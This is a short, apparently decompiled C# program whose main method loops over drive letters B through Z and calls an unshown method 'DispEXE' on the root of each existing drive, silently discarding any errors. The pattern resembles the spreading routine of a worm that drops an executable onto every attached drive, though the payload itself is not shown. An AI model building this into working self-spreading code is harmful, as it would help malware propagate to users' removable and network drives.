using System;
using System.IO;

namespace sex;

internal static class program
{
	[STAThread]
	private static void Main()
	{
		sex sex2 = new sex();
		for (char c = 'B'; c <= 'Z'; c = (char)(c + 1))
		{
			string text = c + ":\\";
			if (Directory.Exists(text))
			{
				try
				{
					sex2.DispEXE(text);
				}
				catch (Exception)
				{
				}
			}
		}
	}
}
